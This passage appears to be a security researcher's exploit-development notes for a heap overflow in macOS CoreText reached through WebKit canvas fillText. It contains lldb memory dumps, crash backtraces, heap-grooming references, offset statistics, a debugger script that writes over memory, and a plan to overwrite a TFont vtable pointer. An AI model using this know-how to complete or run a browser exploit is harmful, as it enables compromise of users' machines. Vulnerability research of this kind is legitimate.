MALLOC_TINY              [0x00007FF7CE300000 - 0x00007FF7CE400000) - rw-/rwx SM=PRV DefaultMallocZone_0x103b86000
glyphs-tfont: 5b0
```

```
(lldbinit) x/180gx --force 7ff7ce36e000
0x7ff7ce36e000: 0x0000000000000010 0x00007ff7ce36dee0
0x7ff7ce36e010: 0x4038000000000000 0x0000000000000000
0x7ff7ce36e020: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e030: 0x40357b9000000000 0x401fc4a000000000
0x7ff7ce36e040: 0x400a0a0000000000 0xaaaaaaaa000008a4
0x7ff7ce36e050: 0x3f86387a36a02c71 0x3f86387a36a02c71
0x7ff7ce36e060: 0xc003e08552dd47c1 0xc02dc5b000000000
0x7ff7ce36e070: 0x40639ddbe439673c 0x4045c96000000000
0x7ff7ce36e080: 0x0000000000000000 0x3f86387a36a02c71
0x7ff7ce36e090: 0x0000000000000000 0x00007ff7ce36bac0
0x7ff7ce36e0a0: 0x0000000000000000 0x00007ff7ce36e0b0
0x7ff7ce36e0b0: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e0c0: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e0d0: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e0e0: 0x0000000000000000 0x000000003f800000
0x7ff7ce36e0f0: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e100: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e110: 0x000000003f800000 0x0000000000000000
0x7ff7ce36e120: 0x00007ff7ce36e9b0 0x00007ff7cf077000
0x7ff7ce36e130: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e140: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e150: 0x00007ff7cf06fc00 0x0000000000000000
0x7ff7ce36e160: 0x00007ff7ce522670 0x4038000000000000
0x7ff7ce36e170: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e180: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e190: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e1a0: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e1b0: 0x0000000000000000 0x000000003f800000
0x7ff7ce36e1c0: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e1d0: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e1e0: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e1f0: 0x00007fff87253f38 0x0000000000000000
0x7ff7ce36e200: 0x0000000000000000 0x00007fff8725bf00
0x7ff7ce36e210: 0x000000000000001c 0x00000001052206a4
0x7ff7ce36e220: 0x00007ffeed1b56d8 0x0000000000000000
0x7ff7ce36e230: 0x00007ff7ce36e248 0x00007ff7ce36e260
0x7ff7ce36e240: 0x00007ff7ce36e260 0x000000000000001c
0x7ff7ce36e250: 0x00000001052206a4 0x00007ff7ce36de70
0x7ff7ce36e260: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e270: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e280: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e290: 0x00007ff7ce36e260 0x0000000000000000
0x7ff7ce36e2a0: 0x4020d13e7ed7b9a3 0x0000000000000000
0x7ff7ce36e2b0: 0x402392bfa71e1726 0x0000000000000000
0x7ff7ce36e2c0: 0x402c094232ec1813 0x0000000000000000
0x7ff7ce36e2d0: 0x4026ce776f90e59d 0x0000000000000000
0x7ff7ce36e2e0: 0x401c145e70076829 0x0000000000000000
0x7ff7ce36e2f0: 0x401df21cb39ddbe4 0x0000000000000000
0x7ff7ce36e300: 0x4020d13e7ed7b9a3 0x0000000000000000
0x7ff7ce36e310: 0x402c094232ec1813 0x0000000000000000
0x7ff7ce36e320: 0x4022d5df984dc5ac 0x0000000000000000
0x7ff7ce36e330: 0x4035e7ed7b9a27d0 0x0000000000000000
0x7ff7ce36e340: 0x4022d5df984dc5ac 0x0000000000000000
0x7ff7ce36e350: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e360: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e370: 0x401c145e70076829 0x0000000000000000
0x7ff7ce36e380: 0x401df21cb39ddbe4 0x0000000000000000
0x7ff7ce36e390: 0x401c145e70076829 0x0000000000000000
0x7ff7ce36e3a0: 0x401c145e70076829 0x0000000000000000
0x7ff7ce36e3b0: 0x402ebfa71e17257f 0x0000000000000000
0x7ff7ce36e3c0: 0x402392bfa71e1726 0x0000000000000000
0x7ff7ce36e3d0: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e3e0: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e3f0: 0x0000000000000000 0x0000000000000000
0x7ff7ce36e400: 0x402a25f5d0c7fc4c 0x0000000000000000
0x7ff7ce36e410: 0x402ebfa71e17257f 0x0000000000000000
0x7ff7ce36e420: 0x4022d5df984dc5ac 0x0000000000000000
0x7ff7ce36e430: 0x401df21cb39ddbe4 0x0000000000000000
0x7ff7ce36e440: 0x40299b14d4f29336 0x0000000000000000
0x7ff7ce36e450: 0x402387a36a02c70f 0x0000000000000000
0x7ff7ce36e460: 0x000000000000001b 0x000000000000001a
0x7ff7ce36e470: 0x0000000000000019 0x0000000000000018
0x7ff7ce36e480: 0x0000000000000017 0x0000000000000016
0x7ff7ce36e490: 0x0000000000000015 0x0000000000000014
0x7ff7ce36e4a0: 0x0000000000000013 0x0000000000000012
0x7ff7ce36e4b0: 0x0000000000000011 0x0000000000000010
0x7ff7ce36e4c0: 0x000000000000000f 0x000000000000000e
0x7ff7ce36e4d0: 0x000000000000000d 0x000000000000000c
0x7ff7ce36e4e0: 0x000000000000000b 0x000000000000000a
0x7ff7ce36e4f0: 0x0000000000000009 0x0000000000000008
0x7ff7ce36e500: 0x0000000000000007 0x0000000000000006
0x7ff7ce36e510: 0x0000000000000005 0x0000000000000004
0x7ff7ce36e520: 0x0000000000000003 0x0000000000000002
0x7ff7ce36e530: 0x0000000000000001 0x0000000000000000
0x7ff7ce36e540: 0x0000081000000000 0x0000081000000810
0x7ff7ce36e550: 0x0000000100000000 0x0000081000000810
0x7ff7ce36e560: 0x0000081000000810 0x9100081800000810
0x7ff7ce36e570: 0x00000000b1000818 0x0000000000000001
0x7ff7ce36e580: 0x0000081000000810 0x3100081800000810
0x7ff7ce36e590: 0x7100081851000818 0x0000081000000810
```

---

need to properly massage the heap with holes

- http://phrack.org/issues/69/9.html
- https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf
- https://www.youtube.com/watch?v=KE9DTSrAtF8
- https://www.slideshare.net/AngelBoy1/macos-memory-allocator-libmalloc-exploitation
- https://blog.shpik.kr/osx,/macos,/heap,/pwnable/2019/05/09/OSX_Heap_Exploitation.html
- https://ctftime.org/writeup/16717

according to minh tuan, just make a super big js object, then it will be allocated with system malloc

time to try

no use only 8kb and above are allocated in system heap

---

some more experiments in experiments/call_order

there are many calls to `TFont`, 1 when setting the font through `setAttributes`, and 6 more when doing `drawText`

and the very last `TFont` is the one used by `TStorageRange`, so that's good

`TStorageRange`+0x18 is of type `_CTGlyphStorage*`
now, to see where glyph storage came from

`TStorageRange` call stack:
- `TStorageRange::TStorageRange(_CTGlyphStorage*, CFRange)`
- `TRun::TRun(_CTGlyphStorage*, CFRange, TAttributes const&)` (537)
- `TCFRef<CTGlyphRun*> TCFBase_NEW<CTGlyphRun, _CTNativeGlyphStorage*&, CFRange&, TAttributes const&>(_CTNativeGlyphStorage*&, CFRange&, TAttributes const&)` (3fc)
- `TGlyphEncoder::EncodeChars(CFRange, TAttributes const&, TGlyphEncoder::Fallbacks)` (a64)
- `TTypesetterUniChar::Initialize` (ff9)

found it, glyph storage is allocated in `TTypesetterUniChar::Initialize`
- which does `objc_msgSend_ptr`
- to call `[_CTNativeGlyphStorage newWithCount:]`
- to call `[_CTNativeGlyphStorage initWithCount:]` (allocates glyph storage object)
- and calls `[_CTNativeGlyphStorage prepareWithCapacity:preallocated:]`
- that calls `calloc` (allocates glyphs)

just 4 calls to `TFont`

calloc return value (base): 0x00007F9D7475B940
glyphs: 0x7f9d7475bc50
glyphs-base = 0x310 (`count * 28`, where `count=28`, equal to the number of glyphs/characters in the poc text)

good, it tallies(?)

very close now, just left with how to get calloc right after tfont
why is there gap?
does it only happen with breakpoint, dont think so though

check out calls between `TFont` and `CTNativeGlyphStorage`

0x00007FFC01F3CBD0

```
(lldbinit) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 4.2
  * frame #0: 0x00007fff21a61d82 CoreText`TFont::TFont(__CTFontDescriptor const*, double, CGAffineTransform const*, __CTFontDescriptor const*)
    frame #1: 0x00007fff21a61c9a CoreText`TCFRef<CTFont*> TCFBase_NEW<CTFont, __CTFontDescriptor const*, double&, CGAffineTransform const*&, __CTFontDescriptor const*&>(__CTFontDescriptor const*&&, double&, CGAffineTransform const*&, __CTFontDescriptor const*&) + 109
    frame #2: 0x00007fff21a61b2a CoreText`CTFontCreateWithFontDescriptor + 108
    frame #3: 0x00007fff21abba4b CoreText`CTFontCreateCopyWithAttributes + 141
    frame #4: 0x000000010a43be3d WebCore`WebCore::FontPlatformData::ctFont() const + 125
    frame #5: 0x000000010c019742 WebCore`WebCore::Font::platformInit() + 178
    frame #6: 0x000000010bf4b856 WebCore`WebCore::Font::Font(WebCore::FontPlatformData const&, WebCore::Font::Origin, WebCore::Font::Interstitial, WebCore::Font::Visibility, WebCore::Font::OrientationFallback, std::__1::optional<WTF::ObjectIdentifier<WebCore::RenderingResourceIdentifierType> >, WebCore::FontCache*) + 774
    frame #7: 0x000000010bf4b0c9 WebCore`WebCore::Font::create(WebCore::FontPlatformData const&, WebCore::Font::Origin, WebCore::Font::Interstitial, WebCore::Font::Visibility, WebCore::Font::OrientationFallback, std::__1::optional<WTF::ObjectIdentifier<WebCore::RenderingResourceIdentifierType> >) + 89
    frame #8: 0x000000010bd7ef77 WebCore`WebCore::CachedFont::createFont(WebCore::FontDescription const&, WTF::AtomString const&, bool, bool, WebCore::FontTaggedSettings<int> const&, WebCore::FontSelectionSpecifiedCapabilities) + 119
    frame #9: 0x000000010b6189b0 WebCore`WebCore::CachedFontLoadRequest::createFont(WebCore::FontDescription const&, WTF::AtomString const&, bool, bool, WebCore::FontTaggedSettings<int> const&, WebCore::FontSelectionSpecifiedCapabilities) + 64
    frame #10: 0x000000010b6144ad WebCore`WebCore::CSSFontFaceSource::font(WebCore::FontDescription const&, bool, bool, WebCore::FontTaggedSettings<int> const&, WebCore::FontSelectionSpecifiedCapabilities) + 413
    frame #11: 0x000000010b60b8df WebCore`WebCore::CSSFontFace::font(WebCore::FontDescription const&, bool, bool, WebCore::ExternalResourceDownloadPolicy) + 703
    frame #12: 0x000000010b641cf7 WebCore`WebCore::CSSFontAccessor::font(WebCore::ExternalResourceDownloadPolicy) const + 71
    frame #13: 0x000000010b641769 WebCore`WebCore::CSSSegmentedFontFace::fontRanges(WebCore::FontDescription const&) + 2217
    frame #14: 0x000000010b616a26 WebCore`WebCore::CSSFontSelector::fontRangesForFamily(WebCore::FontDescription const&, WTF::AtomString const&) + 406
    frame #15: 0x000000010bf5c2c2 WebCore`WebCore::realizeNextFallback(WebCore::FontCascadeDescription const&, unsigned int&, WebCore::FontSelector*) + 306
    frame #16: 0x000000010bf5bb72 WebCore`WebCore::FontCascadeFonts::realizeFallbackRangesAt(WebCore::FontCascadeDescription const&, unsigned int) + 674
    frame #17: 0x000000010a7334d0 WebCore`WebCore::FontCascadeFonts::primaryFont(WebCore::FontCascadeDescription const&) + 48
    frame #18: 0x000000010bacc466 WebCore`WebCore::CanvasRenderingContext2D::drawTextInternal(WTF::String const&, double, double, bool, std::__1::optional<double>) + 982
    frame #19: 0x000000010a8bbb86 WebCore`WebCore::jsCanvasRenderingContext2DPrototypeFunction_fillText(JSC::JSGlobalObject*, JSC::CallFrame*) + 838
```

```
(lldbinit) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 6.1
  * frame #0: 0x00007fff21a93902 CoreText`-[_CTNativeGlyphStorage prepareWithCapacity:preallocated:] + 114
    frame #1: 0x00007fff21a93881 CoreText`-[_CTNativeGlyphStorage initWithCount:] + 220
    frame #2: 0x00007fff21ad4f42 CoreText`TTypesetterUniChar::Initialize() + 62
    frame #3: 0x00007fff21ad4ef4 CoreText`TTypesetterUniChar::TTypesetterUniChar(unsigned short const* (*)(long, long*, __CFDictionary const**, void*), void (*)(unsigned short const*, void*), void*) + 168
    frame #4: 0x00007fff21ad4d6a CoreText`CTLineCreateWithUniCharProvider + 94
    frame #5: 0x000000010b13c5e7 WebCore`WebCore::ComplexTextController::collectComplexTextRunsForCharacters(char16_t const*, unsigned int, unsigned int, WebCore::Font const*) + 727
    frame #6: 0x000000010bf3c62a WebCore`WebCore::ComplexTextController::ComplexTextController(WebCore::FontCascade const&, WebCore::TextRun const&, bool, WTF::HashSet<WebCore::Font const*, WTF::DefaultHash<WebCore::Font const*>, WTF::HashTraits<WebCore::Font const*>, WTF::HashTableTraits>*, bool) + 2586
    frame #7: 0x000000010bf55b42 WebCore`WebCore::FontCascade::width(WebCore::TextRun const&, WTF::HashSet<WebCore::Font const*, WTF::DefaultHash<WebCore::Font const*>, WTF::HashTraits<WebCore::Font const*>, WTF::HashTableTraits>*, WebCore::GlyphOverflow*) const + 466
    frame #8: 0x000000010bacc487 WebCore`WebCore::CanvasRenderingContext2D::drawTextInternal(WTF::String const&, double, double, bool, std::__1::optional<double>) + 1015
    frame #9: 0x000000010a8bbb86 WebCore`WebCore::jsCanvasRenderingContext2DPrototypeFunction_fillText(JSC::JSGlobalObject*, JSC::CallFrame*) + 838
```

`TFont` is part of `TCFBase`, at offset 0x30
`TCFBase` has size 0x218

by `TCFBase<TDescriptor>::Allocate`: 0x00007FD9BBF583E0
tfont: 0x00007FD9BBF58410
diff = 0x30 tallies

`glyphs-base` = 0x310 as seen just now
`TFont` to end = 0x1e8
add them up = 0x4f8 
so this is why i mostly see 0x500

but why sometimes it's not?

getting samples of `glyphs-base`:
- 0x310
- 0x310

only thing i can think of is forcing non-crashing allocations
so that eventually they appear at a predictable offset

---

on a quest now to find out what exactly is in between tfont and glyph storage, why isnt it deterministic?

quickly added this to `cmd_bbb`

```py
    # temporary
    error = lldb.SBError()
    boom_size = glyphs-tfont-0x1e8-0x310
    get_process().WriteMemory(tfont + 0x1e8, b"A" * boom_size, error)
    print(f"[+] wrote {boom_size:x} bytes to {tfont+0x1e8:x} (tfont + 0x1e8)")
```

turns out to be used by bidi stuff

```
(lldbinit) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x414141414158)
  * frame #0: 0x00007fff202e181d libobjc.A.dylib`objc_msgSend + 29
    frame #1: 0x00007fff21ad50fe CoreText`TParagraphStyle::GetNative(void const*) + 20
    frame #2: 0x00007fff21a94444 CoreText`TParagraphStyle::GetBaseWritingDirection() const + 18
    frame #3: 0x00007fff21b2f9ae CoreText`TRunReorder::ReorderRuns(TBidiLevelsProvider const&, TLine&) + 72
    frame #4: 0x00007fff21aa6952 CoreText`TTypesetter::ReorderRunsIfNecessary(std::__1::tuple<TLine const*, TCharStream const*, void const* (*)(__CTRun const*, __CFString const*, void*), void*, std::__1::shared_ptr<TBidiLevelsProvider>*, unsigned int, unsigned char> const&, TLine&) + 60
    frame #5: 0x00007fff21aa6841 CoreText`TTypesetter::FinishLineFill(std::__1::tuple<TLine const*, TCharStream const*, void const* (*)(__CTRun const*, __CFString const*, void*), void*, std::__1::shared_ptr<TBidiLevelsProvider>*, unsigned int, unsigned char> const&, TLine&, double, double) + 43
    frame #6: 0x00007fff21a94e19 CoreText`TTypesetter::FillLine(TLine&, double, double) const + 125
    frame #7: 0x00007fff21ad4dba CoreText`CTLineCreateWithUniCharProvider + 174
    frame #8: 0x000000010b4915e7 WebCore`WebCore::ComplexTextController::collectComplexTextRunsForCharacters(char16_t const*, unsigned int, unsigned int, WebCore::Font const*) + 727
    frame #9: 0x000000010c29162a WebCore`WebCore::ComplexTextController::ComplexTextController(WebCore::FontCascade const&, WebCore::TextRun const&, bool, WTF::HashSet<WebCore::Font const*, WTF::DefaultHash<WebCore::Font const*>, WTF::HashTraits<WebCore::Font const*>, WTF::HashTableTraits>*, bool) + 2586
    frame #10: 0x000000010c2aab42 WebCore`WebCore::FontCascade::width(WebCore::TextRun const&, WTF::HashSet<WebCore::Font const*, WTF::DefaultHash<WebCore::Font const*>, WTF::HashTraits<WebCore::Font const*>, WTF::HashTableTraits>*, WebCore::GlyphOverflow*) const + 466
    frame #11: 0x000000010be21487 WebCore`WebCore::CanvasRenderingContext2D::drawTextInternal(WTF::String const&, double, double, bool, std::__1::optional<double>) + 1015
    frame #12: 0x000000010ac10b86 WebCore`WebCore::jsCanvasRenderingContext2DPrototypeFunction_fillText(JSC::JSGlobalObject*, JSC::CallFrame*) + 838
```

```
(lldbinit) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)
  * frame #0: 0x00007fff22670db6 libicucore.A.dylib`___lldb_unnamed_symbol598$$libicucore.A.dylib + 2214
    frame #1: 0x00007fff2267050a libicucore.A.dylib`ubidi_setPara + 42
    frame #2: 0x00007fff21b4182e CoreText`TICUBidiLevelsProvider::ConfigureBidiEngine(CFRange, CTWritingDirection) const + 124
    frame #3: 0x00007fff21b4186c CoreText`TICUBidiLevelsProvider::GetDefaultParagraphDirection(long) const + 36
    frame #4: 0x00007fff21b2f9c2 CoreText`TRunReorder::ReorderRuns(TBidiLevelsProvider const&, TLine&) + 92
    frame #5: 0x00007fff21aa6952 CoreText`TTypesetter::ReorderRunsIfNecessary(std::__1::tuple<TLine const*, TCharStream const*, void const* (*)(__CTRun const*, __CFString const*, void*), void*, std::__1::shared_ptr<TBidiLevelsProvider>*, unsigned int, unsigned char> const&, TLine&) + 60
    frame #6: 0x00007fff21aa6841 CoreText`TTypesetter::FinishLineFill(std::__1::tuple<TLine const*, TCharStream const*, void const* (*)(__CTRun const*, __CFString const*, void*), void*, std::__1::shared_ptr<TBidiLevelsProvider>*, unsigned int, unsigned char> const&, TLine&, double, double) + 43
    frame #7: 0x00007fff21a94e19 CoreText`TTypesetter::FillLine(TLine&, double, double) const + 125
    frame #8: 0x00007fff21ad4dba CoreText`CTLineCreateWithUniCharProvider + 174
    frame #9: 0x0000000109ea65e7 WebCore`WebCore::ComplexTextController::collectComplexTextRunsForCharacters(char16_t const*, unsigned int, unsigned int, WebCore::Font const*) + 727
    frame #10: 0x000000010aca662a WebCore`WebCore::ComplexTextController::ComplexTextController(WebCore::FontCascade const&, WebCore::TextRun const&, bool, WTF::HashSet<WebCore::Font const*, WTF::DefaultHash<WebCore::Font const*>, WTF::HashTraits<WebCore::Font const*>, WTF::HashTableTraits>*, bool) + 2586
    frame #11: 0x000000010acbfb42 WebCore`WebCore::FontCascade::width(WebCore::TextRun const&, WTF::HashSet<WebCore::Font const*, WTF::DefaultHash<WebCore::Font const*>, WTF::HashTraits<WebCore::Font const*>, WTF::HashTableTraits>*, WebCore::GlyphOverflow*) const + 466
    frame #12: 0x000000010a836487 WebCore`WebCore::CanvasRenderingContext2D::drawTextInternal(WTF::String const&, double, double, bool, std::__1::optional<double>) + 1015
    frame #13: 0x0000000109625b86 WebCore`WebCore::jsCanvasRenderingContext2DPrototypeFunction_fillText(JSC::JSGlobalObject*, JSC::CallFrame*) + 838
```

culprit memory is used by `ReorderRuns` <-- `ReorderRunsIfNecessary` <-- `FinishLineFill` <-- `FillLine`
why does this seem to be not deterministic?

seems to be a `TParagraphStyle` object?

time to sample allocations of `TParagraphStyle` and compare with tfont and glyph storage

ah nvm, just try, with 128 canvas draws, success rate of 5b0 is around 70%, i'll take that for now, just need to poc so i'm happy with it

---

almost there, time to poc, 2 things to overwrite

- `tstoragerange+0x20`: byte21 to disable calling from vtable temporarily
- `tfont+0x160`: vtable

things to change:
- gen.py - 4556 calls (1 less than earlier)
- values in font (at the moment just something in libobjc)
- hardcoded offsets (assuming 0x5b0)

haih i just realized +0x21 is on `TStorageRange` and not `TFont`, another uncertain offset

`glyphs`: `0x00007fe925d729a0`
`tstoragerange`: `0x00007FE925D72058`
distance: 0xfffffffffffff6b8 or -0x948

0x00007FDC60772AC8-0x00007FDC60772400 = 0x6c8
0x00007FEEA6A40658-0x00007FEEA6A40510 = 0x148
0x00007FE1E8E4FBA8-0x00007FE1E8E4FA60 = 0x148
0x00007FD4E833F998-0x00007FD4E83402E0 = -0x948
0x00007F879154D918-0x00007F879154D7D0 = 0x148
0x00007FC71CE6F918-0x00007FC71CE6F7D0 = 0x148
0x00007FDC68F73B18-0x00007FDC68F73470 = 0x6a8
0x00007FCAD9C5B5D8-0x00007FCAD9C5BF40 = -0x968
0x00007FB61AC52F98-0x00007FB61AC52E50 = 0x148
0x00007F819A857898-0x00007F819A8571B0 = 0x6e8

0x148 happens 50% of the time. Can use this for now.

(0x148+0x20/2) = 0xb4
there is a negative offset of 0x1c applied, so should be 0xd0 instead

Bad news! Cannot disable vtable call with `TStorageRange.byte21`, it will go to a call path that results in `-[NSObject(NSObject) doesNotRecognizeSelector:]` at `0x00007fff21a9d2dd`

Not impossible yet. One last chance at `TRunGlue::SetGlyphID<true>`. Try see if `this->field_260` false, can skip vtable call or not.

Nooooo. trunglue is on the stack, cant overwrite anything in it.

---

id of `CTNativeGlyphStorage`: 0x11dffff801a9d51

```
(lldbinit) findmem -q 0x11dffff801a9d51 -m MALLOC_TINY
Found at : 00007FCB03E5BD10 base : 00007FCB03E00000 off : 0005BD10 MALLOC_TINY
Found at : 00007FCB05962C60 base : 00007FCB05900000 off : 00062C60 MALLOC_TINY
```

Looks like many are cleaned up already(?)
Move the bobrosses from `start` to `draw`

Upgrading to 11.6.4, hope the libobjc vmmap doesnt change

```
__LINKEDIT                  [0x00000006D5757000 - 0x00000006D575D000) - rw-/rwx SM=NUL /usr/lib/libobjc-trampolines.dylib
__DATA_DIRTY             [0x00007FFF80711FC0 - 0x00007FFF80714E42) - rw-/rwx SM=COW /usr/lib/libobjc.A.dylib
__DATA                   [0x00007FFF8076B000 - 0x00007FFF8076F450) - rw-/rwx SM=COW /usr/lib/libobjc.A.dylib
__DATA_CONST             [0x00007FFF87162190 - 0x00007FFF871638A0) - rw-/rw- SM=COW /usr/lib/libobjc.A.dylib
__OBJC_RW                [0x00007FFF8E141000 - 0x00007FFF8E200000) - rw-/rwx SM=COW /usr/lib/libobjc.A.dylib
__OBJC_RW                [0x00007FFF8E200000 - 0x00007FFF8E3B1000) - rw-/rwx SM=COW /usr/lib/libobjc.A.dylib
```

in 11.6.4

```
__LINKEDIT                  [0x00000002289F2000 - 0x00000002289F8000) - rw-/rwx SM=NUL /usr/lib/libobjc-trampolines.dylib
__DATA_DIRTY             [0x00007FFF8085CFC0 - 0x00007FFF8085FE42) - rw-/rwx SM=COW /usr/lib/libobjc.A.dylib
__DATA                   [0x00007FFF808B6000 - 0x00007FFF808BA450) - rw-/rwx SM=COW /usr/lib/libobjc.A.dylib
__DATA_CONST             [0x00007FFF87291190 - 0x00007FFF872928A0) - rw-/rw- SM=COW /usr/lib/libobjc.A.dylib
__OBJC_RW                [0x00007FFF8E270000 - 0x00007FFF8E400000) - rw-/rwx SM=COW /usr/lib/libobjc.A.dylib
__OBJC_RW                [0x00007FFF8E400000 - 0x00007FFF8E4E0000) - rw-/rw- SM=COW /usr/lib/libobjc.A.dylib
```

```
__TEXT                   [0x00007FFF776B8000 - 0x00007FFF776C0000) - r-x/r-x SM=COW /usr/lib/libRosetta.dylib
__DATA                   [0x00007FFF86B832E8 - 0x00007FFF86B83308) - rw-/rw- SM=COW /usr/lib/libRosetta.dylib
__DATA_CONST             [0x00007FFF8DB3EEA8 - 0x00007FFF8DB3F150) - rw-/rw- SM=COW /usr/lib/libRosetta.dylib
```

```
__TEXT                   [0x00007FFF77844000 - 0x00007FFF7784C000) - r-x/r-x SM=COW /usr/lib/libRosetta.dylib
__DATA                   [0x00007FFF86D0F2E8 - 0x00007FFF86D0F308) - rw-/rw- SM=COW /usr/lib/libRosetta.dylib
__DATA_CONST             [0x00007FFF8DCCAEA8 - 0x00007FFF8DCCB150) - rw-/rw- SM=COW /usr/lib/libRosetta.dylib
```